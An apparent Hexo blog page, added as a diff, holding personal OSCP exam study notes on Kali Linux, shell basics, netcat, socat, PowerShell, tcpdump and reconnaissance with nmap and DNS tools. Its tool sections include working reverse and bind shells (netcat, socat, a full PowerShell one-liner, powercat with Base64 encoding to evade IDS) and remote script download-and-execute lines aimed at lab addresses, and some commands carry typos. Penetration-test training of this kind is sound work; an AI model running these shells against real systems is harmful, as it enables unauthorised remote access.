@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>oscp | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="1.get comfortable with kali LinuxLinux file system&#x2F;bin         contains basic programs(ls,cat)&#x2F;sbin        system programs(fdisk,mkfs,sysctl)&#x2F;etc         configuration files&#x2F;tmp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="oscp">
+<meta property="og:url" content="http://example.com/2022/07/28/oscp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1.get comfortable with kali LinuxLinux file system&#x2F;bin         contains basic programs(ls,cat)&#x2F;sbin        system programs(fdisk,mkfs,sysctl)&#x2F;etc         configuration files&#x2F;tmp">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/28/oscp/jmpcode.png">
+<meta property="article:published_time" content="2022-07-28T09:31:12.000Z">
+<meta property="article:modified_time" content="2022-08-28T07:15:12.603Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/07/28/oscp/jmpcode.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-oscp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/28/oscp/" class="article-date">
+  <time class="dt-published" datetime="2022-07-28T09:31:12.000Z" itemprop="datePublished">2022-07-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      oscp
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="1-get-comfortable-with-kali-Linux"><a href="#1-get-comfortable-with-kali-Linux" class="headerlink" title="1.get comfortable with kali Linux"></a>1.get comfortable with kali Linux</h3><h4 id="Linux-file-system"><a href="#Linux-file-system" class="headerlink" title="Linux file system"></a>Linux file system</h4><p>&#x2F;bin         contains basic programs(ls,cat)<br>&#x2F;sbin        system programs(fdisk,mkfs,sysctl)<br>&#x2F;etc         configuration files<br>&#x2F;tmp         temporary files(typically deleted on boot)<br>&#x2F;usr&#x2F;bin     application(apt,ncat,nmap)<br>&#x2F;usr&#x2F;share   application support and data files</p>
+<h4 id="basic-command"><a href="#basic-command" class="headerlink" title="basic command"></a>basic command</h4><ul>
+<li>man</li>
+</ul>
+<ul>
+<li>man -k(keyword search) passwd  </li>
+<li>man -k ‘^passwd$’</li>
+</ul>
+<ul>
+<li>apropos (like man -k)</li>
+<li>ls</li>
+<li>cd</li>
+<li>mkdir</li>
+</ul>
+<ul>
+<li>mkdir -p test&#x2F;{test1,test2,test3}</li>
+</ul>
+<h4 id="finding-files"><a href="#finding-files" class="headerlink" title="finding files"></a>finding files</h4><ul>
+<li>which </li>
+<li>locate (qucikest)<br>  sudo updatedb<br>  locate xxx.exe</li>
+<li>find</li>
+</ul>
+<ul>
+<li>find &#x2F; -name xxx*</li>
+</ul>
+<h4 id="manage-kali-linux-services"><a href="#manage-kali-linux-services" class="headerlink" title="manage kali linux services"></a>manage kali linux services</h4><ul>
+<li>ssh (default port 22)<br>  sudo systemctl start ssh<br>  sudo ss -antlp | grep sshd<br>  sudo systemctl enable ssh</li>
+<li>http<br>  sudo systemctl start apache2<br>  sudo ss -antlp | grep apache<br>  sudo systemctl enable apache2<br>  systemctl list-unit-files</li>
+</ul>
+<h4 id="seraching-installing-and-removing-tools"><a href="#seraching-installing-and-removing-tools" class="headerlink" title="seraching,installing and removing tools"></a>seraching,installing and removing tools</h4><ul>
+<li>apt update</li>
+<li>apt upgrade </li>
+<li>apt-cache search</li>
+<li>apt-show</li>
+<li>apt install</li>
+<li>apt remove –purge</li>
+<li>dpkg (offline)</li>
+</ul>
+<ul>
+<li>dpkg -i .&#x2F;xxxx_xxxx.deb</li>
+</ul>
+<h3 id="2-command-line-fun"><a href="#2-command-line-fun" class="headerlink" title="2.command line fun"></a>2.command line fun</h3><h4 id="environment-variables"><a href="#environment-variables" class="headerlink" title="environment variables"></a>environment variables</h4><p>when opening a terminal window, a new bash process has its own environment variables<br>when running a command without full path,the bash will search the path<br><code>echo $PATH</code><br><code>echo $USER</code><br><code>echo $PWD</code><br><code>echo $HOME</code><br><code>export b=10.10.10.3</code> if don’t use export,the variable can just use in current shell<br><code>env</code> show all path</p>
+<h4 id="tab-completion"><a href="#tab-completion" class="headerlink" title="tab completion"></a>tab completion</h4><h4 id="bash-history"><a href="#bash-history" class="headerlink" title="bash history"></a>bash history</h4><p><code>!1</code> repeat the first line command in history<br><code>!!</code> repeat the last command that was executed during our terminal session<br>the history file saved in .bash_history in user home directory<br>ctrl+r can reverse search history</p>
+<h4 id="piping-and-redirection"><a href="#piping-and-redirection" class="headerlink" title="piping and redirection"></a>piping and redirection</h4><ul>
+<li><code>&gt;</code> redirectiing to new file</li>
+<li><code>&gt;&gt;</code> redirecting to existing file</li>
+<li><code>&lt;</code> redirecting from existing file</li>
+<li>0-STDIN 1-STDOUT 2-STDERR</li>
+<li>piping <code>cat error.txt | wc -m &gt; count.txt</code></li>
+</ul>
+<h4 id="text-searching-and-manipulation"><a href="#text-searching-and-manipulation" class="headerlink" title="text searching and manipulation"></a>text searching and manipulation</h4><ul>
+<li>grep <code>ls -la /usr/bin | grep zip</code></li>
+<li>sed <code>echo &quot;I need to try hard&quot; | sed &#39;s/hard/harder/&#39;</code></li>
+<li>cut <code>echo &quot;I hack binaries,web apps,mobile apps,and just about anything else&quot; | cut -f 2 -d &quot;,&quot;</code> <code>cut -d &quot;:&quot; -f 1 /etc/passwd</code></li>
+<li>awk <code>echo &quot;hello::there::friend&quot; | awk -f &quot;::&quot; &#39;&#123;print $1, $3&#125;&#39;</code></li>
+</ul>
+<h4 id="editing-files-from-the-command-line"><a href="#editing-files-from-the-command-line" class="headerlink" title="editing files from the command line"></a>editing files from the command line</h4><ul>
+<li>nano</li>
+<li>vi</li>
+</ul>
+<h4 id="comparing-files"><a href="#comparing-files" class="headerlink" title="comparing files"></a>comparing files</h4><ul>
+<li>comm <code>comm -12 a.txt b.txt</code> suppressed the first and the second columns</li>
+<li>diff <code>diff -c a.txt b.txt</code> <code>diff -u a.txt b.txt</code> </li>
+<li>vimdiff</li>
+</ul>
+<h4 id="managing-processed"><a href="#managing-processed" class="headerlink" title="managing processed"></a>managing processed</h4><ul>
+<li>bg <code>ping -c 400 localhost &gt; ping_result.txt &amp;</code> or <code>ctrl+z</code></li>
+<li>jobs and fg</li>
+</ul>
+<ul>
+<li>fg is to back to the foreground <code>fg %1</code></li>
+</ul>
+<ul>
+<li>ps and kill</li>
+</ul>
+<ul>
+<li>ps -ef -e:select processed -f:display full format listing</li>
+<li>ps -fC leafpad</li>
+</ul>
+<h4 id="file-and-command-monitoring"><a href="#file-and-command-monitoring" class="headerlink" title="file and command monitoring"></a>file and command monitoring</h4><ul>
+<li>tail <code>tail -f /var/log/apache2/access.log</code> -nX:output the last n lines</li>
+<li>watch <code>watch -n 5 w</code></li>
+</ul>
+<h4 id="downloading-files"><a href="#downloading-files" class="headerlink" title="downloading files"></a>downloading files</h4><ul>
+<li>wget <code>wget -O</code></li>
+<li>curl <code>curl -o</code></li>
+<li>axel <code>axel -a -n 20 -o </code></li>
+</ul>
+<h4 id="customizing-the-bash-enviroment"><a href="#customizing-the-bash-enviroment" class="headerlink" title="customizing the bash enviroment"></a>customizing the bash enviroment</h4><ul>
+<li><code>export HISTIGNORE=&quot;&amp;:ls:[bf]g:exit:history&quot;</code></li>
+<li><code>export HISTTIMEFORMAT=&#39;%F %T &#39;</code></li>
+<li>Alias <code>alisa lsa=&#39;ls -al&#39;</code> <code>unalias lsa</code></li>
+<li>~&#x2F;.bashrc</li>
+</ul>
+<h3 id="3-practical-tool"><a href="#3-practical-tool" class="headerlink" title="3.practical tool"></a>3.practical tool</h3><h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><h5 id="connecting-to-a-TCP-x2F-UDP-port"><a href="#connecting-to-a-TCP-x2F-UDP-port" class="headerlink" title="connecting to a TCP&#x2F;UDP port"></a>connecting to a TCP&#x2F;UDP port</h5><p><code>nc -nv 10.101.11.2 110</code><br>-n is to skip DNS name resolution<br>-v is to output specific<br><code>USER xxxx</code> <code>PASS xxxx</code> <code>quit</code></p>
+<h5 id="listening-on-a-TCP-x2F-UDP-port"><a href="#listening-on-a-TCP-x2F-UDP-port" class="headerlink" title="listening on a TCP&#x2F;UDP port"></a>listening on a TCP&#x2F;UDP port</h5><p><code>nc -lvnp 4444</code><br>-l is to create a listener<br>-p is to specify the port </p>
+<h5 id="transferring-files-with-netcat"><a href="#transferring-files-with-netcat" class="headerlink" title="transferring files with netcat"></a>transferring files with netcat</h5><p><code>nc -nlvp 4444 &gt; incoming.exe</code>:redirect any output into a file called incoming.exe<br><code>nc -nv 10.10.23.22 4444 &lt; /usr/share/windows/wget.exe</code>:put the wget.exe to 10.10.23.22</p>
+<h5 id="remote-administration"><a href="#remote-administration" class="headerlink" title="remote administration"></a>remote administration</h5><p><code>nc -nlvp 4444 -e cmd.exe</code>:bound to port 4444 and redirect any input,output and error message from cmd.exe to the network.In other words,everyone who connect bob’s machine will see bob’s cmd.<br>‘nc -nv 10.11.0.22 4444 -e &#x2F;bin&#x2F;bash’:send a reverse shell to target machine,and the target machine can interact with the shell.</p>
+<h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><h5 id="socat-vs-netcat"><a href="#socat-vs-netcat" class="headerlink" title="socat vs netcat"></a>socat vs netcat</h5><p>netcat connect to remote server:<code>nc &lt;remote server&#39;s ip address&gt; 80</code><br>socat connect to remote server:<code>socat -TCP4:&lt;remote servers&#39;s ip address&gt;:80</code><br>netcat bind a listener:<code>nc -lvp localhost 443</code><br>socat bind a listener:<code>socat TCP4-LISTEN:443 STDOUT</code></p>
+<h5 id="socat-file-transfers"><a href="#socat-file-transfers" class="headerlink" title="socat file transfers"></a>socat file transfers</h5><p><code>socat TCP4-LISTEN:443,fork file:secret_password.txt</code><br><code>socat TCP4:10.10.0.4:443 file:received_secret_password.txt,create</code></p>
+<h5 id="socat-reverse-shell"><a href="#socat-reverse-shell" class="headerlink" title="socat reverse shell"></a>socat reverse shell</h5><p><code>socat -d -d TCP4-LISTEN:443 STDOUT</code><br><code>socat TCP4:10.10.0.22:443 EXEC(-e):/bin/bash</code></p>
+<h5 id="socat-Encrypted-bind-shells"><a href="#socat-Encrypted-bind-shells" class="headerlink" title="socat Encrypted bind shells"></a>socat Encrypted bind shells</h5><p><code>openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt</code><br><code>req</code>:initiate a new certificate signing request<br><code>-newkey</code>:generate a new private key<br><code>rsa:2048</code>:use RSA encryption with a 2048-bit key length<br><code>-nodes</code>:store the private key without passphrase protection<br><code>-keyout</code>:save the key to a file<br><code>-x509</code>:output a self-signed certificate instead of a certificate request<br><code>-days</code>:set validity period in days<br><code>-out</code>:save the certificate to a file<br>and combine both of them into a pem file that socat will accept<br><code>cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</code><br><code>socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash</code><br><code>verify=0</code>:disable ssl verification<br><code>fork</code>:spawn a child process</p>
+<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><h5 id="version"><a href="#version" class="headerlink" title="version"></a>version</h5><p>powershell 5.0 runs on </p>
+<ul>
+<li><a href>Windows Server 2016</a>(installed by default)</li>
+<li><a href>Windows Server 2012R2</a>&#x2F;<a href>Windows Server 2012</a>&#x2F;<a href>Windows Server 2008 R2 with Serveice Pack1</a>&#x2F;<a href>Windows 8.1</a>&#x2F;<a href>Windows 7 with Service Pack1</a>(install windows management framework 5.0 to run it)<br>powershell 4.0 runs on </li>
+<li><a href>Windows 8.1</a>&#x2F;<a href>Windows Server 2012 R2</a>(installed by default)</li>
+<li><a href>Windows 7 with Service Pack 1</a>&#x2F;<a href>Windows Server 2008 R2 with Service Pack1</a>(install windows management framework 4.0 to run it)<br>powershell 3.0 runs on</li>
+<li><a href>Windows 8</a>&#x2F;<a href>Windows Server 2012</a>(installed by default)</li>
+<li><a href>Windows 7 with Service Pack1</a>&#x2F;<a href>Windows Server 2008 R2 with Service Pack 1&#x2F;2</a>(install windows management framework 3.0 to run it)<br>powershell maintains an execution policy that determines which type of powershell scripts can be run on the system.The default policy is “Restrict”,which means the system will neither load powershell configuration files nor run powershell scripts.We need to set “Unrestricted” policy on the machine,open the powershell run as administrator.<br>Type <code>Set-ExecutionPolicy Unrestricted</code> and choose yes to finsh the following opreates.</li>
+</ul>
+<h5 id="powershell-file-transfers"><a href="#powershell-file-transfers" class="headerlink" title="powershell file transfers"></a>powershell file transfers</h5><p><code>powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.11.0.4/wget.exe&#39;,&#39;C:\Users\offsec\Desktop\wget.exe&#39;)&quot;</code></p>
+<h5 id="powershell-reverse-shells"><a href="#powershell-reverse-shells" class="headerlink" title="powershell reverse shells"></a>powershell reverse shells</h5><p><code>powershell -c &quot;$client = New-Object Systems.Net.Sockets.TCPClient(&#39;10.11.0.4&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0)&#123;;$data= (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS&#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();&#125;$client.Close()&quot;</code></p>
+<h5 id="powershell-bind-shells"><a href="#powershell-bind-shells" class="headerlink" title="powershell bind shells"></a>powershell bind shells</h5><p><code>powershell -c &quot;$listener = New-Object Systems.Net.Sockets.TCPClient(&#39;0.0.0.0&#39;,443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0)&#123;;$data= (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS&#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();&#125;$client.Close();$listener.Stop()&quot;</code></p>
+<h4 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h4><p>powercat is essentially the powershell version of netcat.<br>first we should type <code>..\powercat.ps1</code> to make all variables and functions declared in the script available in the current powershell scope.<br>if the target machine is connected to Internet,we can use a remote script<br><code>iex (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)</code></p>
+<h5 id="powercat-file-transfers"><a href="#powercat-file-transfers" class="headerlink" title="powercat file transfers"></a>powercat file transfers</h5><p>kali machine:<code>nc -lnvp 443 &gt; receiving_powercat.ps1</code><br>windows machne:<code>powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1</code></p>
+<h5 id="powercat-reverse-shells"><a href="#powercat-reverse-shells" class="headerlink" title="powercat reverse shells"></a>powercat reverse shells</h5><p><code>powercat -c 10.11.0.4 -p 443 -e cmd.exe</code></p>
+<h5 id="powercat-bind-shells"><a href="#powercat-bind-shells" class="headerlink" title="powercat bind shells"></a>powercat bind shells</h5><p><code>powercat -l -p 443 -e cmd.exe</code></p>
+<h5 id="powercat-stand-alone-payloads"><a href="#powercat-stand-alone-payloads" class="headerlink" title="powercat stand-alone payloads"></a>powercat stand-alone payloads</h5><p><code>powercat -c 10.11.0.4 -p 443 -e cmd.exe -g &gt; reverseshell.ps1</code><br>this will create an executable file that can reverse a shell<br><code>./reverseshell.ps1</code><br>but this may easily detected by IDS<br>so we can attemp to execute Base64 encoded commands<br><code>powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge &gt; encodedreverseshell.ps1</code><br>powershell can implement the same function by using<br><code>powershell.exe -E Zgaaasaaaaacasca......(Base64 encoded string)</code></p>
+<h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><h4 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h4><p><code>tcpdump -r password_cracking_filtered.pcap</code></p>
+<h5 id="filtering-traffic"><a href="#filtering-traffic" class="headerlink" title="filtering traffic"></a>filtering traffic</h5><ol>
+<li><code>tcpdump -n -r password_cracking_filtered.pcap | awk -F&quot; &quot; &#39;&#123;print 5&#125;&#39; | sort | uniq -c | head</code><br><code>-n</code>:skip DNS name lookups<br><code>-r</code>:read from our packet capture file<br><code>uniq -c</code>:count the number of times the field appears in the capture<br><code>head</code>:display the first 10 lines of the output</li>
+<li><code>tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap</code><br><code>tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap</code><br><code>tcpdump -n port 81 -r password_cracking_filtered.pcap</code><br>use source host(src host) and destination host(dst host) to filter from the command line<br><code>tcpdump -nX -r password_cracking_filtered.pcap</code><br>print the packet data in both HEX and ASCII format</li>
+</ol>
+<h5 id="advanced-header-filtering"><a href="#advanced-header-filtering" class="headerlink" title="advanced header filtering"></a>advanced header filtering</h5><p><code>echo &quot;$((2#00011000))&quot;</code><br>this represent flag of ACK and PSH<br><code>tcpdump -A -n &#39;tcp[13] = 24&#39; -r password_cracking_filtered.pcap</code><br>-A is to print the packets in ascii<br>tcp[13] is the tcp dump array’s 14th byte,and the 24 is the combination of the two flags,it will only show the http request and response data</p>
+<h3 id="5-bash-scripting"><a href="#5-bash-scripting" class="headerlink" title="5.bash scripting"></a>5.bash scripting</h3><h3 id="6-passive-information-gathering"><a href="#6-passive-information-gathering" class="headerlink" title="6.passive information gathering"></a>6.passive information gathering</h3><h4 id="taking-notes"><a href="#taking-notes" class="headerlink" title="taking notes"></a>taking notes</h4><h4 id="website-recon"><a href="#website-recon" class="headerlink" title="website recon"></a>website recon</h4><h4 id="whois-Enumeration"><a href="#whois-Enumeration" class="headerlink" title="whois Enumeration"></a>whois Enumeration</h4><p><code>whois ipaddress/website</code></p>
+<h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4><h4 id="netcraft"><a href="#netcraft" class="headerlink" title="netcraft"></a>netcraft</h4><p>such as <a href>https://searchdns.netcraft.com</a></p>
+<h4 id="recon-ng"><a href="#recon-ng" class="headerlink" title="recon-ng"></a>recon-ng</h4><p>we need to install various modules to use recon-ng</p>
+<ul>
+<li>marketplace search—<code>marketplace search github</code></li>
+<li>marketplace info—<code>marketplace info recon/domains-hosts/google_site_web</code></li>
+<li>marketplace install—<code>marketplace install recon/domains-hosts/google_site_web</code></li>
+<li>modules load—<code>modules load recon/domains-hosts/google_site_web</code></li>
+<li>option set—<code>options set SOURCE megacorpone.com</code></li>
+<li>run</li>
+<li>back</li>
+<li>show—<code>show hosts</code></li>
+</ul>
+<h4 id="open-source-code"><a href="#open-source-code" class="headerlink" title="open-source code"></a>open-source code</h4><p>gitrob&#x2F;gitleaks</p>
+<h4 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h4><h4 id="security-headers-scanner"><a href="#security-headers-scanner" class="headerlink" title="security headers scanner"></a>security headers scanner</h4><p>Security Headers</p>
+<h4 id="SSL-server-test"><a href="#SSL-server-test" class="headerlink" title="SSL server test"></a>SSL server test</h4><h4 id="Pastebin"><a href="#Pastebin" class="headerlink" title="Pastebin"></a>Pastebin</h4><h4 id="User-information-gathering"><a href="#User-information-gathering" class="headerlink" title="User information gathering"></a>User information gathering</h4><h5 id="email-harvesting"><a href="#email-harvesting" class="headerlink" title="email harvesting"></a>email harvesting</h5><p><code>theHarvester -d magacorpone.com -b google</code></p>
+<h5 id="password-dumps"><a href="#password-dumps" class="headerlink" title="password dumps"></a>password dumps</h5><p>the most common wordlist in kali is rockyou in &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou</p>
+<h4 id="social-media-tools"><a href="#social-media-tools" class="headerlink" title="social media tools"></a>social media tools</h4><ul>
+<li>social-searcher</li>
+<li>site-sprcific tools</li>
+</ul>
+<ul>
+<li>Twofi</li>
+<li>linkedin2username</li>
+</ul>
+<h4 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h4><h4 id="information-gathering-frameworks"><a href="#information-gathering-frameworks" class="headerlink" title="information gathering frameworks"></a>information gathering frameworks</h4><h5 id="OSINT-Framework"><a href="#OSINT-Framework" class="headerlink" title="OSINT Framework"></a>OSINT Framework</h5><h5 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h5><h3 id="7-active-information-gathering"><a href="#7-active-information-gathering" class="headerlink" title="7.active information gathering"></a>7.active information gathering</h3><h4 id="DNS-Enumeration-Domain-Name-system"><a href="#DNS-Enumeration-Domain-Name-system" class="headerlink" title="DNS Enumeration(Domain Name system)"></a>DNS Enumeration(Domain Name system)</h4><h5 id="interacting-with-a-DNS-Server"><a href="#interacting-with-a-DNS-Server" class="headerlink" title="interacting with a DNS Server"></a>interacting with a DNS Server</h5><ul>
+<li>NS - Nameserver records contain the name of the authoritative server hosting the DNS records for a domain.</li>
+<li>A - Also known as a host record,the “a record” contains the IP address of a hostname.</li>
+<li>MX - Mail Exchange records contain the names of the servers responsible for handling email for the domain.A doamin can contain multiple MX records.</li>
+<li>PTR - Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.</li>
+<li>CNAME - Canonical Name Records are used to create aliases for other host records.</li>
+<li>TXT - Text records can contain any arbitrary data and can be used for various purposes,such as domain ownership verification.<br><code>host www.megacorpone.com</code><br><code>host -t mx www.megacorpone.com</code> -t is to specify the type of record</li>
+</ul>
+<h5 id="automating-lookups"><a href="#automating-lookups" class="headerlink" title="automating lookups"></a>automating lookups</h5><h5 id="forward-lookup-brute-force"><a href="#forward-lookup-brute-force" class="headerlink" title="forward lookup brute force"></a>forward lookup brute force</h5><p><code>for ip in $(cat list.txt); do host $ip.megacorpone.com; done</code></p>
+<h5 id="reverse-lookup-brute-force"><a href="#reverse-lookup-brute-force" class="headerlink" title="reverse lookup brute force"></a>reverse lookup brute force</h5><p><code>for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v &quot;not found&quot;</code></p>
+<h5 id="DNS-Zone-Transfers"><a href="#DNS-Zone-Transfers" class="headerlink" title="DNS Zone Transfers"></a>DNS Zone Transfers</h5><p><code>host -l megacorpone.com ns1.megacorpone.com</code> -l(list zone) to attemp the zone transfers<br>some large organizations might host many DNS servers,or we might want to attemp zone transfer request against all the DNS servers in a given domain.<br>get the nameserver for a given domain—-<code>host -t ns megacorpone.com | cut -d &quot; &quot; -f 4</code></p>
+<pre><code>#!/bin/bash
+# Simple zone transfer bash script
+# $1 is the first argument given after the bash script
+if [ -z &quot;$1&quot; ]; then
+  echo &quot;[*] Simple Zone transfer script&quot;
+  echo &quot;[*] Usage   : $0 &lt;damain name&gt; &quot;
+  exit 0
+fi
+
+# if arguement was given, identify the DNS servers for the domain
+for server in $(host -t ns $1 | cut -d &quot; &quot; -f 4); do
+  # For each of these servers, attemp a zone transfer
+  host -l $1 $server |grep &quot;has address&quot;
+done
+</code></pre>
+<h5 id="relevant-tools-in-kali-linux"><a href="#relevant-tools-in-kali-linux" class="headerlink" title="relevant tools in kali linux"></a>relevant tools in kali linux</h5><ul>
+<li>DNSRecon</li>
+</ul>
+<ul>
+<li><code>dnsrecon -d megacorpone.com -t axfr</code>:-d is to specify a domain name,-t is to specify the type of enumeration to perform</li>
+<li><code>dnsrecon -d ,egacorpone.com -D ~/list.txt -t brt</code>:-D is to specify a file name containing potential subdomain strings</li>
+</ul>
+<ul>
+<li>DNSenum</li>
+</ul>
+<ul>
+<li><code>dnsenum zonetransfer.me</code></li>
+</ul>
+<h4 id="port-scanning"><a href="#port-scanning" class="headerlink" title="port scanning"></a>port scanning</h4><h5 id="TCP-x2F-UDP-scanning"><a href="#TCP-x2F-UDP-scanning" class="headerlink" title="TCP&#x2F;UDP scanning"></a>TCP&#x2F;UDP scanning</h5><ul>
+<li>TCP scanning<br><code>nc -nvv -w 1 -z 10.11.1.220 3388-3390</code>:-w is to specify the connection timeout in seconds,-z is to specify zero-I&#x2F;O mode,which will send no data and is used for scanning.</li>
+<li>UDP scanning<br><code>nc -nv -u -z -w 1 10.11.1.115 160-162</code>:-u is indicates a UDP scan</li>
+</ul>
+<h5 id="port-scanning-with-nmap"><a href="#port-scanning-with-nmap" class="headerlink" title="port scanning with nmap"></a>port scanning with nmap</h5><ul>
+<li><ol>
+<li>stealth&#x2F;SYN scanning<br><code>nmap -sS 10.10.1.220</code></li>
+</ol>
+</li>
+<li><ol start="2">
+<li>TCP connecct scanning<br><code>nmap -sT 10.10.1.220</code></li>
+</ol>
+</li>
+<li><ol start="3">
+<li>UDP scanning<br><code>nmap -sU 10.10.1.220</code><br>the UDP scan can also be used in conjunction with a TCP SYN scan to build a more complete pocture of our target<br><code>nmap -sS -sU 10.10.1.220</code></li>
+</ol>
+</li>
+<li><ol start="4">
+<li>network sweeping<br><code>nmap -sn 10.10.1.1-254</code><br><code>nmap -v -sn 10.10.1.1-254 -oG ping-sweep.txt</code>:-oG is to save the result into a format<br><code>nmap -p 80 10.10.1.1-254 -oG web-sweep.txt</code><br><code>nmap -sT -A --top-ports=20 10.10.1.1-254 -oG top-port-sweep.txt</code>:-A is to enable OS version detection,script scanning,and traceroute,and the top 20 ports is in &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;nmap-services</li>
+</ol>
+</li>
+<li><ol start="5">
+<li>OS fingerprinting<br><code>nmap -O 10.10.1.220</code></li>
+</ol>
+</li>
+<li><ol start="6">
+<li>Banner grabbing&#x2F;service Enumeration<br><code>nmap -sV -sT -A 10.10.1.220</code>:-sV is to inspecting service banners</li>
+</ol>
+</li>
+<li><ol start="7">
+<li>nmap scripting engine(NSE)<br><code>nmap 10.10.1.110 --script=smb-os-discovery</code><br><code>nmap --script-help dns-zone-transfer</code></li>
+</ol>
+</li>
+</ul>
+<h5 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h5><p><code>masscan -p80 10.0.0.0/8</code><br><code>masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1</code>:-e is to specify the raw network interface to use,–router-ip is to specify the ip address for the appropriate gateway</p>
+<h4 id="SMB-Enumeration-Server-message-block"><a href="#SMB-Enumeration-Server-message-block" class="headerlink" title="SMB Enumeration(Server message block)"></a>SMB Enumeration(Server message block)</h4><h5 id="scanning-for-the-netbios-service"><a href="#scanning-for-the-netbios-service" class="headerlink" title="scanning for the netbios service"></a>scanning for the netbios service</h5><p><code>nmap -v -p 139,445 -oG smb.txt 10.11.11.1-254</code><br><code>nbtscan -r 10.11.11.0/24</code>:-r is to specify the originating UDP port as 137</p>
+<h5 id="Nmap-SMB-NSE-scripts"><a href="#Nmap-SMB-NSE-scripts" class="headerlink" title="Nmap SMB NSE scripts"></a>Nmap SMB NSE scripts</h5><p>&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;smb*</p>
+<h4 id="NFS-Enumeration-NetWork-file-system"><a href="#NFS-Enumeration-NetWork-file-system" class="headerlink" title="NFS Enumeration(NetWork file system)"></a>NFS Enumeration(NetWork file system)</h4><h5 id="scanning-for-NFS-shares"><a href="#scanning-for-NFS-shares" class="headerlink" title="scanning for NFS shares"></a>scanning for NFS shares</h5><p>both portmapper and rpcbind run on tcp port 111<br><code>nmap -V -p 111 10.11.1.1-254</code><br><code>nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254</code></p>
